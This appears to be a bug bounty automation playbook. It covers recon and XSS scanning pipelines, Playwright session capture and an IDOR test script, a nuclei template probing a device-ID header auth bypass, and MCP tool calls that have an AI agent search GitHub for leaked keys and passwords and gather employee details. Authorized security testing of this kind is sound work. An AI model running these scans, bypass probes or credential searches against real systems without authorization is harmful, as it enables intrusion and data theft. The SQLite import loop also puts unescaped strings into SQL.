# Automation Framework — No Mercy Hunter v3.0

Full automation chains, script pipelines, MCP integration patterns, and orchestration.

---

## scripts/recon.sh — Step-by-Step Explanation

The recon.sh script runs the full passive-to-active recon pipeline for a single domain.
Usage: bash scripts/recon.sh TARGET [output_dir]

### What each step does

Step 1/7 — Passive subdomain enumeration
  Runs four tools in parallel (background processes), each writing to its own file.
  subfinder: Queries Certificate Transparency, DNS brute force, passive sources.
  assetfinder: Queries certspotter, hackertarget, urlscan, wayback.
  amass: Passive mode only (no active DNS queries). Comprehensive but slow.
  findomain: Uses certificate transparency logs via its own API.
  All results merged and deduplicated into subs/all.txt.

Step 2/7 — DNS resolution
  dnsx resolves each subdomain in subs/all.txt.
  Flags: -a (A records), -resp (show IP).
  Output: subs/resolved.txt with IP addresses.
  Purpose: Separates live DNS records from dead/parked subdomains.

Step 3/7 — Live host probing
  httpx probes each subdomain for HTTP/HTTPS.
  Flags: -title (page title), -tech-detect (technology fingerprinting), -status-code.
  Output: live/hosts.txt with status codes, titles, and technology stack.
  This is the most valuable output — use for all subsequent scanning.

Step 4/7 — Port scan (top 1000)
  naabu scans all resolved subdomains for top 1000 ports.
  Output: ports/open.txt with host:port pairs.
  Look for: 8080, 8443 (web), 9200 (Elasticsearch), 5601 (Kibana), 6443 (K8s).

Step 5/7 — URL history mining
  gau queries: Common Crawl, OTX, URLScan, Wayback Machine.
  waybackurls queries Wayback Machine CDX API specifically.
  Combined output deduped into urls/all.txt.
  This surfaces: old API endpoints, parameter names, legacy paths, source map URLs.

Step 6/7 — Crawl live hosts (katana)
  katana crawls each live host up to depth 2.
  Discovers JavaScript-rendered endpoints that gau/waybackurls miss.
  Output: urls/katana.txt

Step 7/7 — Nuclei vulnerability scan
  nuclei runs templates against all live hosts.
  Flags: -severity critical,high,medium (skips low/info to reduce noise).
  Output: nuclei/findings.txt
  Templates cover: CVEs, exposed panels, misconfigurations, default credentials.

### Extending recon.sh

After running recon.sh, run these additional steps manually:

  # Source map extraction
  grep -E "\.map|sourceMappingURL" urls/all.txt | httpx -silent > urls/source-map-urls.txt

  # Parameter discovery on interesting endpoints
  cat urls/all.txt | grep "?" | arjun --stdin -oT params/discovered-params.txt

  # XSS pipeline
  bash scripts/xss-pipeline.sh TARGET

---

## XSS Automation Pipeline (scripts/xss-pipeline.sh)

Full pipeline from URL collection to confirmed XSS.

### Step-by-step

Step 1 — Collect historical URLs
  gau --subs TARGET: queries Common Crawl, OTX, URLScan, Wayback for all subdomains.
  waybackurls TARGET: Wayback Machine CDX API.
  Combined output sorted and deduped into xss/all_urls.txt.

Step 2 — Filter parameterized URLs
  grep '=' filters to URLs containing query parameters.
  qsreplace 'XSS' replaces all parameter values with the string 'XSS'.
  Output: xss/params.txt — ready for injection testing.

Step 3 — Reflection probe (kxss)
  kxss checks which URLs reflect the injected value in the response.
  Output: xss/reflected.txt — only URLs where XSS value appears in response.
  This dramatically reduces false positives before dalfox.

Step 4 — gf pattern filter
  gf xss applies tomnomnom's pattern list to find XSS-likely parameter names.
  Pattern list matches: q, search, query, keyword, s, input, text, name, etc.
  Output: xss/gf_xss.txt

Step 5 — Dalfox active scan
  dalfox runs active XSS testing on the gf-filtered URL list.
  Flags: --silence (reduce output noise), -o (write findings).
  Dalfox attempts: reflected, DOM-based, and stored XSS patterns.
  Output: xss/dalfox.txt with confirmed/potential findings.

### Extending the XSS pipeline

  # Add ParamSpider for JavaScript-discovered parameters
  paramspider -d TARGET -o params/paramspider.txt
  cat params/paramspider.txt >> xss/params.txt

  # Test for DOM XSS specifically
  cat urls/katana.txt | grep "=" | dalfox pipe --dom --silence

---

## Playwright Session Capture and Replay

### Capture authenticated session

```javascript
// capture-session.js — run with: node capture-session.js
const { chromium } = require('playwright');
const fs = require('fs');

(async () => {
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext({
    recordHar: { path: 'sessions/TARGET-session.har' }
  });
  const page = await context.newPage();

  // Navigate and authenticate manually
  await page.goto('https://TARGET.com/login');
  console.log('Please authenticate in the browser. Press Enter when done...');
  await new Promise(r => process.stdin.once('data', r));

  // Save cookies and storage state
  await context.storageState({ path: 'sessions/TARGET-auth.json' });
  await context.close();
  await browser.close();
  console.log('Session saved to sessions/TARGET-auth.json');
})();
```

### Replay authenticated session for API testing

```javascript
// replay-session.js
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch();
  const context = await browser.newContext({
    storageState: 'sessions/TARGET-auth.json'  // load saved session
  });
  const page = await context.newPage();

  // Now all requests include auth cookies automatically
  const response = await page.goto('https://TARGET.com/api/v1/users/me');
  const body = await page.evaluate(() => document.body.innerText);
  console.log('Authenticated response:', body);

  await browser.close();
})();
```

### Automated multi-step exploit chain

```javascript
// exploit-chain.js — for IDOR testing with two accounts
const { chromium } = require('playwright');
const fs = require('fs');

async function testIDOR(accountASession, accountBSession, resourceEndpoint) {
  const browser = await chromium.launch();

  // Account A: create resource
  const ctxA = await browser.newContext({ storageState: accountASession });
  const pageA = await ctxA.newPage();
  const createResp = await pageA.evaluate(async (endpoint) => {
    const r = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: 'IDOR test marker xyz789' })
    });
    return { status: r.status, body: await r.json() };
  }, resourceEndpoint);
  const resourceId = createResp.body.id;
  console.log(`Account A created resource: ${resourceId}`);

  // Account B: attempt to read Account A's resource
  const ctxB = await browser.newContext({ storageState: accountBSession });
  const pageB = await ctxB.newPage();
  const readResp = await pageB.evaluate(async (endpoint, id) => {
    const r = await fetch(`${endpoint}/${id}`);
    return { status: r.status, body: await r.text() };
  }, resourceEndpoint, resourceId);

  console.log(`Account B reading Account A resource: ${readResp.status}`);
  if (readResp.status === 200) {
    console.log('IDOR CONFIRMED: Cross-account read successful');
    fs.writeFileSync('evidence/idor-confirmed.json',
      JSON.stringify({ resourceId, response: readResp.body }, null, 2));
  }

  await browser.close();
}

testIDOR(
  'sessions/account-a.json',
  'sessions/account-b.json',
  'https://TARGET.com/v1/memories'
);
```

---

## SQLite Findings DB Automation

### Initialize DB for new target

```bash
sqlite3 bug_bounty.db "INSERT INTO targets (domain, program, scope)
  VALUES ('target.com', 'bugcrowd', '[\"target.com\", \"*.target.com\", \"api.target.com\"]');"
TARGET_ID=$(sqlite3 bug_bounty.db "SELECT id FROM targets WHERE domain='target.com';")
echo "Target ID: $TARGET_ID"
```

### Bulk import subdomains after recon

```bash
while IFS= read -r sub; do
  sqlite3 bug_bounty.db "INSERT OR IGNORE INTO subdomains (target_id, subdomain)
    VALUES ($TARGET_ID, '$sub');"
done < recon/target.com/subs/all.txt
```

### Log a finding

```bash
sqlite3 bug_bounty.db "INSERT INTO findings
  (target_id, finding_id, title, severity, cvss_score, cvss_vector, endpoint, description, status)
  VALUES (
    $TARGET_ID,
    'F-11',
    'Unauthenticated access to /api/v1/config endpoint',
    'P3',
    5.3,
    'AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
    '/api/v1/config',
    'The configuration endpoint returns application settings without authentication.',
    'draft'
  );"
```

### Update finding status after submission

```bash
sqlite3 bug_bounty.db "UPDATE findings
  SET status='submitted', submitted_at=datetime('now'), report_id='BC-12345678', platform='bugcrowd'
  WHERE finding_id='F-11';"
```

### Daily summary report

```bash
sqlite3 -column -header bug_bounty.db "
SELECT finding_id, title, severity, status, report_id
FROM findings_summary
ORDER BY CASE severity WHEN 'P1' THEN 1 WHEN 'P2' THEN 2 WHEN 'P3' THEN 3 ELSE 4 END,
         created_at DESC;"
```

---

## MCP Server Integration Patterns

### mcp__filesystem — file operations

Use for: reading recon output files, writing findings, managing evidence directory.

Read recon output:
  mcp__filesystem__read_text_file: path = "C:/Users/mnile/Desktop/bug_bounty/recon/TARGET/live/hosts.txt"

List evidence directory:
  mcp__filesystem__list_directory: path = "C:/Users/mnile/Desktop/bug_bounty/evidence/FINDING-ID"

Create evidence directory:
  mcp__filesystem__create_directory: path = "C:/Users/mnile/Desktop/bug_bounty/evidence/F-11"

### mcp__memory — cross-session persistence

Use for: storing key findings, target state, recon progress across Claude sessions.

Store a finding:
  mcp__memory__create_entities: [{
    "name": "F-11-target.com",
    "entityType": "Finding",
    "observations": ["CVSS 5.3", "endpoint /api/v1/config", "status: draft", "found 2026-06-21"]
  }]

Recall findings for a target:
  mcp__memory__search_nodes: query = "target.com findings"

### mcp__sequential-thinking — complex attack chain reasoning

Use for: planning multi-step exploit chains, analyzing whether findings chain to higher severity.

Example: "Given F-08 (Azure AD tenant leak) and confirmed ROPC enabled, what are the
steps to demonstrate full account takeover? What evidence do I need at each step?"

### mcp__github — code search for leaked credentials

Search target org repos:
  mcp__github__search_code: query = "target.com api_key OR secret OR password"
  mcp__github__search_code: query = "org:target-org internal api_key"

Find internal endpoints in public code:
  mcp__github__search_code: query = "target.com /api/internal OR /admin OR /bootstrap"

### mcp__brave-search — OSINT and news

Search for recent security disclosures:
  mcp__brave-search__brave_web_search: query = "site:hackerone.com target.com disclosed"
  mcp__brave-search__brave_web_search: query = "target.com bug bounty CVE 2025 2026"

Find employee email patterns:
  mcp__brave-search__brave_web_search: query = "site:linkedin.com target.com engineer"

### mcp__sqlite — direct DB queries

Run findings summary:
  mcp__sqlite (use mcp__postgres__query or sqlite3 CLI): 
  "SELECT * FROM findings_summary WHERE severity IN ('P1','P2') ORDER BY created_at DESC;"

### mcp__fetch — HTTP requests

Fetch target endpoints:
  mcp__fetch__fetch: url = "https://target.com/.well-known/openid-configuration"
  mcp__fetch__fetch: url = "https://crt.sh/?q=%25.target.com&output=json"

### mcp__playwright — browser automation

Navigate and capture:
  mcp__playwright__browser_navigate: url = "https://target.com/login"
  mcp__playwright__browser_fill_form: selector = "#email", value = "test@test.com"
  mcp__playwright__browser_take_screenshot: path = "evidence/F-11/screenshots/01.png"

### mcp__browser-tools — audit and debugging

Run accessibility audit (also reveals hidden elements):
  mcp__browser-tools__runAuditMode
  mcp__browser-tools__getNetworkLogs
  mcp__browser-tools__getConsoleErrors

### mcp__github — create issues to track findings

  mcp__github__create_issue: {
    "owner": "your-org", "repo": "bug-bounty-tracker",
    "title": "F-11: Unauthenticated /api/v1/config — target.com",
    "body": "Severity: P3\nStatus: draft\nEndpoint: /api/v1/config\n\nSee evidence/F-11/"
  }

---

## Nuclei Template Selection and Update

### Update nuclei templates

```bash
nuclei -update-templates
nuclei -update
```

### Template categories for bug bounty

```bash
# Exposed panels and admin interfaces
nuclei -l live/hosts.txt -t exposed-panels/ -o nuclei/panels.txt

# Misconfigurations
nuclei -l live/hosts.txt -t misconfiguration/ -o nuclei/misconfigs.txt

# Default credentials
nuclei -l live/hosts.txt -t default-logins/ -o nuclei/default-creds.txt

# CVEs (filter to recent)
nuclei -l live/hosts.txt -t cves/ -tags 2024,2025,2026 -o nuclei/cves.txt

# Takeover checks
nuclei -l live/hosts.txt -t takeovers/ -o nuclei/takeovers.txt

# JWT testing
nuclei -l live/hosts.txt -t token-spray/ -o nuclei/tokens.txt

# Full critical + high scan
nuclei -l live/hosts.txt -severity critical,high -o nuclei/critical-high.txt

# Cloud misconfigurations
nuclei -l live/hosts.txt -t cloud/ -o nuclei/cloud.txt
```

### Custom nuclei template for device ID bypass (F-01 pattern)

```yaml
id: device-id-auth-bypass
info:
  name: Device ID Header Auth Bypass
  severity: high
  tags: auth,bypass,custom
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/users/me"
      - "{{BaseURL}}/backend-api/me"
    headers:
      OAI-Device-Id: "test-device-{{randstr}}"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["user_id", "email", "account"]
        part: body
```

---

## Full Session Automation Script

Run this at the start of every bug bounty session:

```bash
#!/usr/bin/env bash
# session-start.sh — initialize a new bug bounty session
TARGET="$1"
DATE=$(date +%Y%m%d)
SESSION_DIR="sessions/$DATE-$TARGET"
mkdir -p "$SESSION_DIR"

echo "=== No Mercy Hunter v3.0 Session Start ==="
echo "Target: $TARGET"
echo "Date: $DATE"
echo "Session: $SESSION_DIR"

# Check program scope
echo "[!] Manual step: verify $TARGET scope at program page"
echo "[!] Check: is testing authorized for $TARGET ?"
read -p "Scope confirmed? (y/n): " confirm
[ "$confirm" != "y" ] && echo "Aborting." && exit 1

# Initialize SQLite record
TARGET_ID=$(sqlite3 bug_bounty.db \
  "INSERT INTO targets (domain, program) VALUES ('$TARGET', 'manual'); SELECT last_insert_rowid();")
sqlite3 bug_bounty.db \
  "INSERT INTO scans (target_id, scan_type, status, output_path) \
   VALUES ($TARGET_ID, 'full_session', 'running', '$SESSION_DIR');"

# Run passive recon
echo "[1] Running passive recon..."
bash scripts/recon.sh "$TARGET" "$SESSION_DIR"

# Run XSS pipeline
echo "[2] Running XSS pipeline..."
bash scripts/xss-pipeline.sh "$TARGET"

echo "[+] Initial automation complete. Review: $SESSION_DIR/"
echo "[+] Next: manual auth surface mapping, AI-specific testing"
sqlite3 bug_bounty.db \
  "UPDATE scans SET status='passive_complete', completed_at=datetime('now') WHERE target_id=$TARGET_ID;"
```
